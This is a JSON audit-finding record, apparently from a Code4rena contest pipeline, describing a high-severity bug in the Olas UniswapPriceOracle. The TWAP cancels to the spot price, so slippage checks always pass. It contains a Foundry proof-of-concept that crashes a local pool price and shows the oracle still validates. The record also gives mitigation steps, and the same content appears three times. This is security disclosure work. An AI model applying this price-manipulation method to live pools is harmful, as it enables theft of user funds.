@@ -1,0 +1,128 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Olas_j3PRAMM3fVq",
+    "audit_uid": "j3PRAMM3fVq",
+    "requested_submission_uid": "fvnHZN9Wssa",
+    "requested_finding_uid": "9eKVuFn3L2m",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Olas_j3PRAMM3fVq/20260618_133156/findings.json",
+    "source_submission_uid": "fvnHZN9Wssa",
+    "source_finding_uid": "9eKVuFn3L2m",
+    "original_report_path": "Olas_j3PRAMM3fVq\\high_valid_fvnHZN9Wssa.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "fvnHZN9Wssa",
+  "finding_uid": "9eKVuFn3L2m",
+  "finding_number": "2",
+  "title": "UniswapPriceOracle.validatePrice() TWAP always equals spot price due to algebraic self-cancellation, rendering all V2 slippage protection non-functional",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "Cryptor",
+  "body": "## Finding description and impact\n\nUniswapPriceOracle.validatePrice() is intended to compare the current pool spot price against a Uniswap V2 TWAP to detect pool manipulation. If deviation exceeds a caller-supplied slippage tolerance, it should return false. However, the TWAP calculation contains an algebraic error that causes it to always equal the current spot price, meaning the function unconditionally returns true.\n\nThe function reads cumulativePriceLast (call it C) from the Uniswap V2 pair, then computes:\n\n```\nuint256 cumulativePrice = cumulativePriceLast + (tradePrice * elapsedTime);  // C + P·Δt\nuint256 timeWeightedAverage = (cumulativePrice - cumulativePriceLast) / elapsedTime;\n// = (C + P·Δt − C) / Δt = P\n```\n\nhttps://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/oracles/UniswapPriceOracle.sol#L77-L82\n\nThe stored cumulative history C cancels out. timeWeightedAverage always equals tradePrice (the spot price), so derivation is always 0, and the function always returns true.\n\nA correct TWAP requires two cumulative-price snapshots separated in time. This oracle reads one snapshot from the pair but never stores a prior snapshot of its own — it fabricates the second data point from the current spot price, collapsing the calculation into a tautology.\n\n## Impact on downstream callers:\n\nBuyBackBurner._buyOLAS() (line 185) — the pre-swap require(IOracle(poolOracle).validatePrice(maxSlippage), ...) always passes, allowing V2 swaps to execute at arbitrarily manipulated prices.\n\nLiquidityManagerETH._checkTokensAndRemoveLiquidityV2() (line 170) — the oracle guard never reverts, and the subsequent removeLiquidity call uses amountAMin = 1, amountBMin = 1, providing zero effective protection.\n\nLiquidityManagerOptimism._checkTokensAndRemoveLiquidityV2() (line 232) — same issue; the Balancer exitPool call uses minAmountsOut = [1, 1].\n\nAn attacker can flashloan assets to manipulate pool reserves, trigger any of these operations, and profit from the skewed prices — the oracle gate that was supposed to prevent this passes unconditionally.\n\nNumerical example: If an attacker manipulates a WETH-OLAS pool from a spot price of 100 OLAS/WETH to 25 OLAS/WETH (a 75% manipulation), the oracle computes:\n\n\n```\ntradePrice = 25e18\ncumulativePrice = C + 25e18 × 100\ntimeWeightedAverage = (C + 2500e18 - C) / 100 = 25e18\nderivation = |25e18 - 25e18| / 25e18 = 0\nreturn 0 <= maxSlippage → true  // passes despite 75% manipulation\n```\n\n\n\n## Recommended mitigation steps\n\nRefactor the oracle to store a prior cumulative price snapshot, enabling a true two-point TWAP calculation. The oracle needs:\n\nA storage struct to hold (cumulativePrice, timestamp) from a previous point in time.\nA updateSnapshot() function called periodically (e.g. by a keeper) to record the current cumulative price.\nvalidatePrice() computes TWAP as (currentCumulative − storedCumulative) / (now − storedTimestamp) and compares against spot.",
+  "proof_of_concept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {UniswapPriceOracle} from \"../contracts/oracles/UniswapPriceOracle.sol\";\nimport {ZuniswapV2Factory} from \"../lib/zuniswapv2/src/ZuniswapV2Factory.sol\";\nimport {ZuniswapV2Pair} from \"../lib/zuniswapv2/src/ZuniswapV2Pair.sol\";\nimport {ZuniswapV2Router} from \"../lib/zuniswapv2/src/ZuniswapV2Router.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\ncontract Token is ERC20 {\n    constructor(string memory s) ERC20(s, s, 18) {}\n    function mint(address to, uint256 a) external { _mint(to, a); }\n}\n\n/// @title Minimal PoC: UniswapPriceOracle TWAP is tautological\n/// @notice validatePrice() always returns true (except same-block) because its\n///         \"TWAP\" = (C + P*dt - C) / dt = P (spot), so derivation is always 0.\n///\n/// forge test --match-contract MinimalTWAPExploit -vvv\ncontract MinimalTWAPExploit is Test {\n    Token olas;\n    Token weth;\n    ZuniswapV2Router router;\n    ZuniswapV2Pair pair;\n    UniswapPriceOracle oracle;\n\n    function setUp() public {\n        vm.warp(1_700_000_000);\n\n        olas = new Token(\"OLAS\");\n        weth = new Token(\"WETH\");\n\n        ZuniswapV2Factory factory = new ZuniswapV2Factory();\n        router = new ZuniswapV2Router(address(factory));\n        pair = ZuniswapV2Pair(factory.createPair(address(olas), address(weth)));\n\n        // Seed pool: 1M OLAS / 500 WETH  (price = 2000 OLAS per WETH)\n        olas.mint(address(this), 1_000_000e18);\n        weth.mint(address(this), 500e18);\n        olas.approve(address(router), type(uint256).max);\n        weth.approve(address(router), type(uint256).max);\n        router.addLiquidity(\n            address(olas), address(weth),\n            1_000_000e18, 500e18, 0, 0, address(this)\n        );\n\n        // Build cumulative price history, then advance so elapsedTime > 0\n        vm.warp(block.timestamp + 3600);\n        pair.sync();\n        vm.warp(block.timestamp + 600);\n\n        oracle = new UniswapPriceOracle(address(weth), 50, address(pair));\n    }\n\n    /// @notice Crash the price 98% with a real swap; oracle still says \"all clear.\"\n    function test_exploit() public {\n        uint256 priceBefore = oracle.getPrice();\n\n        // --- Attacker dumps 4500 WETH into a 500-WETH pool ---\n        address attacker = makeAddr(\"attacker\");\n        weth.mint(attacker, 4500e18);\n        vm.startPrank(attacker);\n        weth.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(weth);\n        path[1] = address(olas);\n        router.swapExactTokensForTokens(4500e18, 1, path, attacker);\n        vm.stopPrank();\n\n        uint256 priceAfter = oracle.getPrice();\n        uint256 dropPct = ((priceBefore - priceAfter) * 100) / priceBefore;\n\n        // Price crashed ~98%\n        assertGt(dropPct, 90, \"price must crash >90%\");\n\n        // Advance 1 block so we're past the same-block guard\n        vm.warp(block.timestamp + 12);\n\n        // BUG: oracle returns true with ZERO slippage tolerance after a 98% crash\n        assertTrue(oracle.validatePrice(0), \"EXPLOIT: validatePrice(0) passes after 98% crash\");\n    }\n}",
+  "lines_of_code": [
+    "https://github.com/valory-xyz/autonolas-tokenomics/blob/main/contracts/oracles/UniswapPriceOracle.sol#L79-L82"
+  ],
+  "source_record": {
+    "project_id": "j3PRAMM3fVq",
+    "submission_index": "768",
+    "api_submission_id": "",
+    "uid": "fvnHZN9Wssa",
+    "number": "768",
+    "title": "UniswapPriceOracle.validatePrice() TWAP always equals spot price due to algebraic self-cancellation, rendering all V2 slippage protection non-functional",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "Cryptor",
+    "lines_of_code": [
+      "https://github.com/valory-xyz/autonolas-tokenomics/blob/main/contracts/oracles/UniswapPriceOracle.sol#L79-L82"
+    ],
+    "body": "## Finding description and impact\n\nUniswapPriceOracle.validatePrice() is intended to compare the current pool spot price against a Uniswap V2 TWAP to detect pool manipulation. If deviation exceeds a caller-supplied slippage tolerance, it should return false. However, the TWAP calculation contains an algebraic error that causes it to always equal the current spot price, meaning the function unconditionally returns true.\n\nThe function reads cumulativePriceLast (call it C) from the Uniswap V2 pair, then computes:\n\n```\nuint256 cumulativePrice = cumulativePriceLast + (tradePrice * elapsedTime);  // C + P·Δt\nuint256 timeWeightedAverage = (cumulativePrice - cumulativePriceLast) / elapsedTime;\n// = (C + P·Δt − C) / Δt = P\n```\n\nhttps://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/oracles/UniswapPriceOracle.sol#L77-L82\n\nThe stored cumulative history C cancels out. timeWeightedAverage always equals tradePrice (the spot price), so derivation is always 0, and the function always returns true.\n\nA correct TWAP requires two cumulative-price snapshots separated in time. This oracle reads one snapshot from the pair but never stores a prior snapshot of its own — it fabricates the second data point from the current spot price, collapsing the calculation into a tautology.\n\n## Impact on downstream callers:\n\nBuyBackBurner._buyOLAS() (line 185) — the pre-swap require(IOracle(poolOracle).validatePrice(maxSlippage), ...) always passes, allowing V2 swaps to execute at arbitrarily manipulated prices.\n\nLiquidityManagerETH._checkTokensAndRemoveLiquidityV2() (line 170) — the oracle guard never reverts, and the subsequent removeLiquidity call uses amountAMin = 1, amountBMin = 1, providing zero effective protection.\n\nLiquidityManagerOptimism._checkTokensAndRemoveLiquidityV2() (line 232) — same issue; the Balancer exitPool call uses minAmountsOut = [1, 1].\n\nAn attacker can flashloan assets to manipulate pool reserves, trigger any of these operations, and profit from the skewed prices — the oracle gate that was supposed to prevent this passes unconditionally.\n\nNumerical example: If an attacker manipulates a WETH-OLAS pool from a spot price of 100 OLAS/WETH to 25 OLAS/WETH (a 75% manipulation), the oracle computes:\n\n\n```\ntradePrice = 25e18\ncumulativePrice = C + 25e18 × 100\ntimeWeightedAverage = (C + 2500e18 - C) / 100 = 25e18\nderivation = |25e18 - 25e18| / 25e18 = 0\nreturn 0 <= maxSlippage → true  // passes despite 75% manipulation\n```\n\n\n\n## Recommended mitigation steps\n\nRefactor the oracle to store a prior cumulative price snapshot, enabling a true two-point TWAP calculation. The oracle needs:\n\nA storage struct to hold (cumulativePrice, timestamp) from a previous point in time.\nA updateSnapshot() function called periodically (e.g. by a keeper) to record the current cumulative price.\nvalidatePrice() computes TWAP as (currentCumulative − storedCumulative) / (now − storedTimestamp) and compares against spot.",
+    "proof_of_concept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {UniswapPriceOracle} from \"../contracts/oracles/UniswapPriceOracle.sol\";\nimport {ZuniswapV2Factory} from \"../lib/zuniswapv2/src/ZuniswapV2Factory.sol\";\nimport {ZuniswapV2Pair} from \"../lib/zuniswapv2/src/ZuniswapV2Pair.sol\";\nimport {ZuniswapV2Router} from \"../lib/zuniswapv2/src/ZuniswapV2Router.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\ncontract Token is ERC20 {\n    constructor(string memory s) ERC20(s, s, 18) {}\n    function mint(address to, uint256 a) external { _mint(to, a); }\n}\n\n/// @title Minimal PoC: UniswapPriceOracle TWAP is tautological\n/// @notice validatePrice() always returns true (except same-block) because its\n///         \"TWAP\" = (C + P*dt - C) / dt = P (spot), so derivation is always 0.\n///\n/// forge test --match-contract MinimalTWAPExploit -vvv\ncontract MinimalTWAPExploit is Test {\n    Token olas;\n    Token weth;\n    ZuniswapV2Router router;\n    ZuniswapV2Pair pair;\n    UniswapPriceOracle oracle;\n\n    function setUp() public {\n        vm.warp(1_700_000_000);\n\n        olas = new Token(\"OLAS\");\n        weth = new Token(\"WETH\");\n\n        ZuniswapV2Factory factory = new ZuniswapV2Factory();\n        router = new ZuniswapV2Router(address(factory));\n        pair = ZuniswapV2Pair(factory.createPair(address(olas), address(weth)));\n\n        // Seed pool: 1M OLAS / 500 WETH  (price = 2000 OLAS per WETH)\n        olas.mint(address(this), 1_000_000e18);\n        weth.mint(address(this), 500e18);\n        olas.approve(address(router), type(uint256).max);\n        weth.approve(address(router), type(uint256).max);\n        router.addLiquidity(\n            address(olas), address(weth),\n            1_000_000e18, 500e18, 0, 0, address(this)\n        );\n\n        // Build cumulative price history, then advance so elapsedTime > 0\n        vm.warp(block.timestamp + 3600);\n        pair.sync();\n        vm.warp(block.timestamp + 600);\n\n        oracle = new UniswapPriceOracle(address(weth), 50, address(pair));\n    }\n\n    /// @notice Crash the price 98% with a real swap; oracle still says \"all clear.\"\n    function test_exploit() public {\n        uint256 priceBefore = oracle.getPrice();\n\n        // --- Attacker dumps 4500 WETH into a 500-WETH pool ---\n        address attacker = makeAddr(\"attacker\");\n        weth.mint(attacker, 4500e18);\n        vm.startPrank(attacker);\n        weth.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(weth);\n        path[1] = address(olas);\n        router.swapExactTokensForTokens(4500e18, 1, path, attacker);\n        vm.stopPrank();\n\n        uint256 priceAfter = oracle.getPrice();\n        uint256 dropPct = ((priceBefore - priceAfter) * 100) / priceBefore;\n\n        // Price crashed ~98%\n        assertGt(dropPct, 90, \"price must crash >90%\");\n\n        // Advance 1 block so we're past the same-block guard\n        vm.warp(block.timestamp + 12);\n\n        // BUG: oracle returns true with ZERO slippage tolerance after a 98% crash\n        assertTrue(oracle.validatePrice(0), \"EXPLOIT: validatePrice(0) passes after 98% crash\");\n    }\n}",
+    "detail_url": "https://code4rena.com/api/v1/audits/j3PRAMM3fVq/submissions/768",
+    "raw": {
+      "auditUid": "j3PRAMM3fVq",
+      "createdAt": "2026-02-06T07:03:56.719Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "czPzxgS22ad",
+          "userUid": "qRHoF9ASsG7",
+          "userAuditRole": "sponsor",
+          "createdAt": "2026-02-13T19:38:58.707Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "9eKVuFn3L2m"
+        },
+        {
+          "uid": "6ZaYkiZfpDd",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T14:28:01.741Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "9eKVuFn3L2m"
+        },
+        {
+          "uid": "Ctdm33uRFhc",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T14:28:28.854Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "9eKVuFn3L2m"
+        },
+        {
+          "uid": "Zc6y3Ljqaas",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T14:39:00.760Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "fvnHZN9Wssa",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "9eKVuFn3L2m",
+        "number": 2,
+        "duplicates": 129
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-03-13T20:28:53.654Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "UniswapPriceOracle.validatePrice() TWAP always equals spot price due to algebraic self-cancellation, rendering all V2 slippage protection non-functional",
+      "uid": "fvnHZN9Wssa",
+      "updatedAt": "2026-02-06T07:03:56.719Z",
+      "user": {
+        "uid": "cAxBnD6hLiL",
+        "handle": "Cryptor"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nUniswapPriceOracle.validatePrice() is intended to compare the current pool spot price against a Uniswap V2 TWAP to detect pool manipulation. If deviation exceeds a caller-supplied slippage tolerance, it should return false. However, the TWAP calculation contains an algebraic error that causes it to always equal the current spot price, meaning the function unconditionally returns true.\n\nThe function reads cumulativePriceLast (call it C) from the Uniswap V2 pair, then computes:\n\n```\nuint256 cumulativePrice = cumulativePriceLast + (tradePrice * elapsedTime);  // C + P·Δt\nuint256 timeWeightedAverage = (cumulativePrice - cumulativePriceLast) / elapsedTime;\n// = (C + P·Δt − C) / Δt = P\n```\n\nhttps://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/oracles/UniswapPriceOracle.sol#L77-L82\n\nThe stored cumulative history C cancels out. timeWeightedAverage always equals tradePrice (the spot price), so derivation is always 0, and the function always returns true.\n\nA correct TWAP requires two cumulative-price snapshots separated in time. This oracle reads one snapshot from the pair but never stores a prior snapshot of its own — it fabricates the second data point from the current spot price, collapsing the calculation into a tautology.\n\n## Impact on downstream callers:\n\nBuyBackBurner._buyOLAS() (line 185) — the pre-swap require(IOracle(poolOracle).validatePrice(maxSlippage), ...) always passes, allowing V2 swaps to execute at arbitrarily manipulated prices.\n\nLiquidityManagerETH._checkTokensAndRemoveLiquidityV2() (line 170) — the oracle guard never reverts, and the subsequent removeLiquidity call uses amountAMin = 1, amountBMin = 1, providing zero effective protection.\n\nLiquidityManagerOptimism._checkTokensAndRemoveLiquidityV2() (line 232) — same issue; the Balancer exitPool call uses minAmountsOut = [1, 1].\n\nAn attacker can flashloan assets to manipulate pool reserves, trigger any of these operations, and profit from the skewed prices — the oracle gate that was supposed to prevent this passes unconditionally.\n\nNumerical example: If an attacker manipulates a WETH-OLAS pool from a spot price of 100 OLAS/WETH to 25 OLAS/WETH (a 75% manipulation), the oracle computes:\n\n\n```\ntradePrice = 25e18\ncumulativePrice = C + 25e18 × 100\ntimeWeightedAverage = (C + 2500e18 - C) / 100 = 25e18\nderivation = |25e18 - 25e18| / 25e18 = 0\nreturn 0 <= maxSlippage → true  // passes despite 75% manipulation\n```\n\n\n\n## Recommended mitigation steps\n\nRefactor the oracle to store a prior cumulative price snapshot, enabling a true two-point TWAP calculation. The oracle needs:\n\nA storage struct to hold (cumulativePrice, timestamp) from a previous point in time.\nA updateSnapshot() function called periodically (e.g. by a keeper) to record the current cumulative price.\nvalidatePrice() computes TWAP as (currentCumulative − storedCumulative) / (now − storedTimestamp) and compares against spot.",
+      "proofOfConcept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {UniswapPriceOracle} from \"../contracts/oracles/UniswapPriceOracle.sol\";\nimport {ZuniswapV2Factory} from \"../lib/zuniswapv2/src/ZuniswapV2Factory.sol\";\nimport {ZuniswapV2Pair} from \"../lib/zuniswapv2/src/ZuniswapV2Pair.sol\";\nimport {ZuniswapV2Router} from \"../lib/zuniswapv2/src/ZuniswapV2Router.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\ncontract Token is ERC20 {\n    constructor(string memory s) ERC20(s, s, 18) {}\n    function mint(address to, uint256 a) external { _mint(to, a); }\n}\n\n/// @title Minimal PoC: UniswapPriceOracle TWAP is tautological\n/// @notice validatePrice() always returns true (except same-block) because its\n///         \"TWAP\" = (C + P*dt - C) / dt = P (spot), so derivation is always 0.\n///\n/// forge test --match-contract MinimalTWAPExploit -vvv\ncontract MinimalTWAPExploit is Test {\n    Token olas;\n    Token weth;\n    ZuniswapV2Router router;\n    ZuniswapV2Pair pair;\n    UniswapPriceOracle oracle;\n\n    function setUp() public {\n        vm.warp(1_700_000_000);\n\n        olas = new Token(\"OLAS\");\n        weth = new Token(\"WETH\");\n\n        ZuniswapV2Factory factory = new ZuniswapV2Factory();\n        router = new ZuniswapV2Router(address(factory));\n        pair = ZuniswapV2Pair(factory.createPair(address(olas), address(weth)));\n\n        // Seed pool: 1M OLAS / 500 WETH  (price = 2000 OLAS per WETH)\n        olas.mint(address(this), 1_000_000e18);\n        weth.mint(address(this), 500e18);\n        olas.approve(address(router), type(uint256).max);\n        weth.approve(address(router), type(uint256).max);\n        router.addLiquidity(\n            address(olas), address(weth),\n            1_000_000e18, 500e18, 0, 0, address(this)\n        );\n\n        // Build cumulative price history, then advance so elapsedTime > 0\n        vm.warp(block.timestamp + 3600);\n        pair.sync();\n        vm.warp(block.timestamp + 600);\n\n        oracle = new UniswapPriceOracle(address(weth), 50, address(pair));\n    }\n\n    /// @notice Crash the price 98% with a real swap; oracle still says \"all clear.\"\n    function test_exploit() public {\n        uint256 priceBefore = oracle.getPrice();\n\n        // --- Attacker dumps 4500 WETH into a 500-WETH pool ---\n        address attacker = makeAddr(\"attacker\");\n        weth.mint(attacker, 4500e18);\n        vm.startPrank(attacker);\n        weth.approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(weth);\n        path[1] = address(olas);\n        router.swapExactTokensForTokens(4500e18, 1, path, attacker);\n        vm.stopPrank();\n\n        uint256 priceAfter = oracle.getPrice();\n        uint256 dropPct = ((priceBefore - priceAfter) * 100) / priceBefore;\n\n        // Price crashed ~98%\n        assertGt(dropPct, 90, \"price must crash >90%\");\n\n        // Advance 1 block so we're past the same-block guard\n        vm.warp(block.timestamp + 12);\n\n        // BUG: oracle returns true with ZERO slippage tolerance after a 98% crash\n        assertTrue(oracle.validatePrice(0), \"EXPLOIT: validatePrice(0) passes after 98% crash\");\n    }\n}",
+      "linesOfCode": "https://github.com/valory-xyz/autonolas-tokenomics/blob/main/contracts/oracles/UniswapPriceOracle.sol#L79-L82",
+      "number": 768,
+      "aiExplanation": null,
+      "_index": 768
+    }
+  }
+}
